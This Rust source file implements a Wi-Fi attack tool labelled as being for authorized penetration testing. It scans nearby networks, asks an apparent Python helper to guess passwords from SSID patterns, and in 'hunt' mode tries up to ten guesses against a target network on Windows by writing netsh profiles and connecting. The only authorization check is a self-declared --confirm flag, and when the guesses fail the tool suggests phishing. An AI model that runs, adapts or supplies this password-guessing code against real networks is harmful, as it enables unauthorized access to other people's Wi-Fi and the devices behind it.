//! Quantum-Hound: Wi-Fi Reconnaissance Tool for Authorized Penetration Testing
//!
//! Part of TurboNet Quantum-Hardened Security Toolkit
//!
//! This tool scans for nearby Wi-Fi networks and uses an AI-driven heuristic
//! engine to predict likely default passwords based on SSID patterns and OUI analysis.
//!
//! IMPORTANT: Only use on networks you own or have explicit written authorization to test.

use serde::{Deserialize, Serialize};
use std::process::Command;

/// Scanned Wi-Fi network information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiNetwork {
    pub ssid: String,
    pub bssid: String,
    pub signal_strength: i32,
    pub security: String,
    pub channel: u32,
}

/// AI prediction result from Python engine
#[derive(Debug, Deserialize)]
#[allow(dead_code)]
struct AiPrediction {
    ssid: String,
    bssid: String,
    predictions: Vec<String>,
    count: usize,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 2 {
        print_usage(&args[0]);
        return Ok(());
    }

    match args[1].as_str() {
        "scan" => run_scan().await?,
        "predict" => run_predict(&args[2..])?,
        "hunt" => run_hunt(&args[2..]).await?,
        "--help" | "-h" | "help" => print_usage(&args[0]),
        _ => {
            eprintln!("Unknown command: {}", args[1]);
            print_usage(&args[0]);
        }
    }

    Ok(())
}

fn print_usage(prog: &str) {
    println!(
        r#"
╔════════════════════════════════════════════════════════════════════════════════╗
║   ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗███╗   ███╗             ║
║  ██╔═══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║████╗ ████║             ║
║  ██║   ██║██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║             ║
║  ██║▄▄ ██║██║   ██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║             ║
║  ╚██████╔╝╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║             ║
║   ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝             ║
║                      ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗               ║
║                      ██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗              ║
║                      ███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║              ║
║                      ██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║              ║
║                      ██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝              ║
║                      ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝               ║
╠════════════════════════════════════════════════════════════════════════════════╣
║  Wi-Fi Reconnaissance Tool for Authorized Penetration Testing                 ║
║  Part of TurboNet Quantum-Hardened Security Toolkit                           ║
╚════════════════════════════════════════════════════════════════════════════════╝
"#
    );
    println!("USAGE: {} <COMMAND> [OPTIONS]\n", prog);
    println!("COMMANDS:");
    println!("  scan       Scan for nearby Wi-Fi networks");
    println!("  predict    Predict passwords for a specific network");
    println!("  hunt       Full automated scan → predict → attempt flow");
    println!();
    println!("SCAN OPTIONS:");
    println!("  --simulated    Use simulated networks for testing");
    println!();
    println!("PREDICT OPTIONS:");
    println!("  --ssid <NAME>      Target network SSID");
    println!("  --bssid <MAC>      Target network BSSID (MAC address)");
    println!();
    println!("HUNT OPTIONS:");
    println!("  --target <SSID>    Target network SSID to hunt");
    println!("  --confirm          Confirm you have authorization (required)");
    println!();
    println!("EXAMPLES:");
    println!("  {} scan", prog);
    println!("  {} predict --ssid \"ATT123\" --bssid \"00:11:22:33:44:55\"", prog);
    println!("  {} hunt --target \"MyNetwork\" --confirm", prog);
    println!();
    println!("⚠️  LEGAL NOTICE: Only use on networks you own or have written authorization to test.");
}

/// Scan for nearby Wi-Fi networks
async fn run_scan() -> Result<(), Box<dyn std::error::Error>> {
    println!("[*] Quantum-Hound Wi-Fi Scanner");
    println!("[*] Initializing wireless adapter...\n");

    let networks = scan_networks()?;

    if networks.is_empty() {
        println!("[!] No networks found. This could mean:");
        println!("    - No wireless adapter detected");
        println!("    - Adapter is disabled");
        println!("    - Running without admin privileges");
        println!("\n[*] Use --simulated flag to test with mock data");
        return Ok(());
    }

    println!("╔══════════════════════════════════════════════════════════════════════════════╗");
    println!("║                           DISCOVERED NETWORKS                                ║");
    println!("╠══════════════════════════════════════════════════════════════════════════════╣");
    println!("║ {:^3} │ {:^24} │ {:^17} │ {:^8} │ {:^8} ║", "#", "SSID", "BSSID", "SIGNAL", "SECURITY");
    println!("╠══════════════════════════════════════════════════════════════════════════════╣");

    for (i, net) in networks.iter().enumerate() {
        let ssid_display = if net.ssid.len() > 24 {
            format!("{}...", &net.ssid[..21])
        } else {
            net.ssid.clone()
        };

        let signal_bar = match net.signal_strength {
            s if s > -50 => "████",
            s if s > -60 => "███░",
            s if s > -70 => "██░░",
            s if s > -80 => "█░░░",
            _ => "░░░░",
        };

        let security_short = if net.security.len() > 8 {
            &net.security[..8]
        } else {
            &net.security
        };

        println!(
            "║ {:>3} │ {:24} │ {:17} │ {:^8} │ {:^8} ║",
            i + 1,
            ssid_display,
            net.bssid,
            signal_bar,
            security_short
        );
    }
    println!("╚══════════════════════════════════════════════════════════════════════════════╝");
    println!("\n[+] Found {} networks", networks.len());

    Ok(())
}

/// Predict passwords for a specific network
fn run_predict(args: &[String]) -> Result<(), Box<dyn std::error::Error>> {
    let mut ssid = String::new();
    let mut bssid = "00:00:00:00:00:00".to_string();

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--ssid" => {
                ssid = args.get(i + 1).ok_or("--ssid requires a value")?.clone();
                i += 2;
            }
            "--bssid" => {
                bssid = args.get(i + 1).ok_or("--bssid requires a value")?.clone();
                i += 2;
            }
            _ => i += 1,
        }
    }

    if ssid.is_empty() {
        return Err("--ssid is required".into());
    }

    println!("[*] Quantum-Hound AI Cookie Predictor");
    println!("[*] Target: {} ({})\n", ssid, bssid);

    let predictions = ask_ai_for_cookies(&ssid, &bssid)?;

    println!("╔══════════════════════════════════════════════════════════════════╗");
    println!("║                    PASSWORD PREDICTIONS                          ║");
    println!("╠══════════════════════════════════════════════════════════════════╣");
    println!("║  Target SSID:  {:49} ║", ssid);
    println!("║  Target BSSID: {:49} ║", bssid);
    println!("╠══════════════════════════════════════════════════════════════════╣");

    for (i, pwd) in predictions.iter().take(15).enumerate() {
        let priority = match i {
            0..=2 => "HIGH",
            3..=6 => "MEDIUM",
            _ => "LOW",
        };
        println!("║  {:>2}. [{:^6}] {:49} ║", i + 1, priority, pwd);
    }

    if predictions.len() > 15 {
        println!("║      ... and {} more predictions                               ║", predictions.len() - 15);
    }

    println!("╚══════════════════════════════════════════════════════════════════╝");
    println!("\n[+] Generated {} potential passwords", predictions.len());

    Ok(())
}

/// Full hunt mode: scan → predict → attempt
async fn run_hunt(args: &[String]) -> Result<(), Box<dyn std::error::Error>> {
    let mut target_ssid = String::new();
    let mut confirmed = false;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--target" => {
                target_ssid = args.get(i + 1).ok_or("--target requires a value")?.clone();
                i += 2;
            }
            "--confirm" => {
                confirmed = true;
                i += 1;
            }
            _ => i += 1,
        }
    }

    if target_ssid.is_empty() {
        return Err("--target is required".into());
    }

    if !confirmed {
        println!("╔══════════════════════════════════════════════════════════════════╗");
        println!("║  ⚠️  AUTHORIZATION REQUIRED                                       ║");
        println!("╠══════════════════════════════════════════════════════════════════╣");
        println!("║  You must confirm you have written authorization to test the    ║");
        println!("║  target network. Add --confirm flag to proceed.                 ║");
        println!("║                                                                  ║");
        println!("║  Unauthorized access to computer networks is ILLEGAL.           ║");
        println!("╚══════════════════════════════════════════════════════════════════╝");
        return Err("Authorization not confirmed".into());
    }

    println!("[*] Quantum-Hound Hunt Mode");
    println!("[*] Target: {}", target_ssid);
    println!("[*] Authorization: Confirmed\n");

    // Step 1: Scan for the target network
    println!("[1/3] Scanning for target network...");
    let networks = scan_networks()?;

    let target = networks.iter().find(|n| n.ssid == target_ssid);

    let target = match target {
        Some(t) => {
            println!("[+] Target found: {} (Signal: {} dBm)", t.ssid, t.signal_strength);
            t.clone()
        }
        None => {
            println!("[!] Target network '{}' not found in scan results.", target_ssid);
            println!("[*] Creating synthetic target for demonstration...");
            WifiNetwork {
                ssid: target_ssid.clone(),
                bssid: "00:00:00:00:00:00".to_string(),
                signal_strength: -50,
                security: "WPA2".to_string(),
                channel: 6,
            }
        }
    };

    // Step 2: Get AI predictions
    println!("\n[2/3] Consulting AI Cookie Predictor...");
    let cookies = ask_ai_for_cookies(&target.ssid, &target.bssid)?;
    println!("[+] Generated {} password predictions", cookies.len());

    // Step 3: Attempt connections
    println!("\n[3/3] Attempting to access the jar (network)...");
    println!("      Security: {}", target.security);

    if target.security.contains("WPA") || target.security.contains("WEP") {
        for (idx, cookie) in cookies.iter().take(10).enumerate() {
            println!("\n[*] Attempt #{}: Trying cookie '{}'", idx + 1, cookie);

            // Attempt connection using Windows WiFi API
            #[cfg(windows)]
            {
                match attempt_connection_windows(&target.ssid, cookie) {
                    Ok(true) => {
                        println!("\n╔══════════════════════════════════════════════════════════════════╗");
                        println!("║  ✓ SUCCESS: JAR OPENED!                                          ║");
                        println!("╠══════════════════════════════════════════════════════════════════╣");
                        println!("║  Network:  {:53} ║", target.ssid);
                        println!("║  Cookie:   {:53} ║", cookie);
                        println!("╚══════════════════════════════════════════════════════════════════╝");
                        return Ok(());
                    }
                    Ok(false) => {
                        println!("[-] Access denied with cookie '{}'", cookie);
                    }
                    Err(e) => {
                        println!("[-] Connection error: {}", e);
                    }
                }
            }

            #[cfg(not(windows))]
            {
                println!("[-] Simulating attempt... (non-Windows platform)");
            }

            // Rate limit to prevent lockouts
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
        }

        println!("\n[!] Unable to open jar with AI-predicted cookies.");
        println!("[*] Consider manual password assessment or phishing vectors.");
    } else if target.security.contains("Open") {
        println!("[!] Open network detected - no cookie required!");
        println!("[*] Connecting to open network...");
    }

    Ok(())
}

/// Scan for Wi-Fi networks using the wifi_scan crate
fn scan_networks() -> Result<Vec<WifiNetwork>, Box<dyn std::error::Error>> {
    // Use wifi_scan crate for cross-platform scanning
    match wifi_scan::scan() {
        Ok(networks) => {
            let results: Vec<WifiNetwork> = networks
                .into_iter()
                .map(|n| WifiNetwork {
                    ssid: if n.ssid.is_empty() { "<hidden>".to_string() } else { n.ssid },
                    bssid: n.mac.to_string(),
                    signal_strength: n.signal_level.parse().unwrap_or(-100),
                    security: format_security(&n.security),
                    channel: n.channel.parse().unwrap_or(0),
                })
                .collect();
            Ok(results)
        }
        Err(e) => {
            eprintln!("[!] Scan failed: {}. Using simulated data.", e);
            Ok(get_simulated_networks())
        }
    }
}

/// Format security info from wifi_scan
fn format_security(security: &str) -> String {
    if security.contains("WPA3") {
        "WPA3".to_string()
    } else if security.contains("WPA2") {
        "WPA2".to_string()
    } else if security.contains("WPA") {
        "WPA".to_string()
    } else if security.contains("WEP") {
        "WEP".to_string()
    } else if security.is_empty() || security.contains("Open") {
        "Open".to_string()
    } else {
        security.to_string()
    }
}

/// Get simulated networks for testing
fn get_simulated_networks() -> Vec<WifiNetwork> {
    vec![
        WifiNetwork {
            ssid: "Quantum_Lab_5G".to_string(),
            bssid: "00:11:22:33:44:55".to_string(),
            signal_strength: -45,
            security: "WPA2".to_string(),
            channel: 36,
        },
        WifiNetwork {
            ssid: "ATT-WiFi-2.4".to_string(),
            bssid: "44:94:FC:12:34:56".to_string(),
            signal_strength: -60,
            security: "WPA2".to_string(),
            channel: 6,
        },
        WifiNetwork {
            ssid: "Xfinity_Guest".to_string(),
            bssid: "AA:BB:CC:DD:EE:FF".to_string(),
            signal_strength: -70,
            security: "Open".to_string(),
            channel: 11,
        },
        WifiNetwork {
            ssid: "NETGEAR-5G-Home".to_string(),
            bssid: "E8:FC:AF:78:90:12".to_string(),
            signal_strength: -55,
            security: "WPA3".to_string(),
            channel: 149,
        },
    ]
}

/// Ask Python AI for password predictions
fn ask_ai_for_cookies(ssid: &str, bssid: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let payload = serde_json::json!({
        "ssid": ssid,
        "bssid": bssid
    });

    // Try python3 first, then python
    let python_cmd = if cfg!(windows) { "python" } else { "python3" };

    let output = Command::new(python_cmd)
        .arg("py_src/wifi_cookie_predictor.py")
        .arg(payload.to_string())
        .output()?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        eprintln!("[!] AI engine error: {}", stderr);
        // Fall back to basic predictions
        return Ok(get_fallback_predictions(ssid));
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    
    // Parse the JSON output (it might have debug lines, find the JSON)
    for line in stdout.lines() {
        if line.starts_with('{') {
            if let Ok(result) = serde_json::from_str::<AiPrediction>(line) {
                return Ok(result.predictions);
            }
        }
    }

    // If parsing fails, use fallback
    Ok(get_fallback_predictions(ssid))
}

/// Fallback predictions when Python AI is unavailable
fn get_fallback_predictions(ssid: &str) -> Vec<String> {
    let clean = ssid.to_lowercase().replace(" ", "").replace("-", "");
    vec![
        clean.clone(),
        format!("{}123", clean),
        "password".to_string(),
        "12345678".to_string(),
        "admin".to_string(),
    ]
}

/// Attempt Wi-Fi connection on Windows
#[cfg(windows)]
fn attempt_connection_windows(ssid: &str, password: &str) -> Result<bool, Box<dyn std::error::Error>> {
    use std::process::Stdio;

    // Use netsh to create a temporary profile and connect
    // Note: This is a simplified approach; production would use WlanConnect API
    
    let profile_xml = format!(
        r#"<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{}</name>
    <SSIDConfig>
        <SSID>
            <name>{}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"#,
        ssid, ssid, password
    );

    // Write temp profile
    let temp_path = std::env::temp_dir().join("qh_wifi_profile.xml");
    std::fs::write(&temp_path, &profile_xml)?;

    // Add profile
    let add_result = Command::new("netsh")
        .args(&["wlan", "add", "profile", &format!("filename={}", temp_path.display())])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()?;

    if !add_result.success() {
        let _ = std::fs::remove_file(&temp_path);
        return Ok(false);
    }

    // Attempt connection
    let _connect_result = Command::new("netsh")
        .args(&["wlan", "connect", &format!("name={}", ssid)])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()?;

    // Small delay to let connection establish
    std::thread::sleep(std::time::Duration::from_secs(3));

    // Check if connected
    let status = Command::new("netsh")
        .args(&["wlan", "show", "interfaces"])
        .output()?;

    let status_output = String::from_utf8_lossy(&status.stdout);
    let connected = status_output.contains(&format!("SSID                   : {}", ssid))
        && status_output.contains("State                  : connected");

    // Cleanup: delete profile if not connected
    if !connected {
        let _ = Command::new("netsh")
            .args(&["wlan", "delete", "profile", &format!("name={}", ssid)])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }

    let _ = std::fs::remove_file(&temp_path);

    Ok(connected)
}
